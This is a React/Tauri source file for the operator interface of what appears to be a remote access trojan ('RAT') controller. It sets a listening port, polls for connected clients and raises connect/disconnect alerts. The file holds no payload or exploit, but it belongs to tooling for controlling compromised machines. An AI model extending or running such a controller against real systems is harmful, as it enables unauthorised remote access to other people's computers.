import { useState, useEffect } from "react";
import { RATContext } from "./RATContext";
import { invoke } from "@tauri-apps/api/tauri";
import { listen } from "@tauri-apps/api/event";
import toast from "react-hot-toast";

export const RATProvider = ({ children }) => {
  const [port, setPort] = useState("1337");
  const [running, setRunning] = useState(false);
  const [clientList, setClientList] = useState({});
  const [notificationClient, setNotificationClient] = useState(true);
  const [loaded, setLoaded] = useState(false);

  const [selectedClient, setSelectedClient] = useState("");

  async function fetchClients() {
    setClientList(await invoke("fetch_clients"));
  }

  useEffect(() => {
    if (!running) return;

    fetchClients();

    const interval = setInterval(fetchClients, 10000);

    return () => clearInterval(interval);
  }, [running]);

  const customToast = (icon, toast_message, bg) => {
    console.log(toast_message);
    return toast(toast_message, {
      icon,
      className: `${bg} text-white text-lg font-bold`,
    });
  };

  async function waitNotification(type) {
    const _ = listen(type, (event) => {
      let icon = type == "client_connected" ? "🤙" : "👋";
      let message = type == "client_connected" ? "connected" : "disconnected";
      let bg = type == "client_connected" ? "bg-primary" : "bg-neutral";
      let toast_message = `Client ${event.payload} has ${message}!`;

      customToast(icon, toast_message, bg);

      fetchClients();
    });
  }

  useEffect(() => {
    if (notificationClient) {
      waitNotification("client_connected");
      waitNotification("client_disconnected");
    }
  }, [notificationClient]);

  const RATdata = {
    port,
    setPort,
    fetchClients,
    setRunning,
    running,
    clientList,
    setSelectedClient,
    selectedClient,
  };

  return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
};
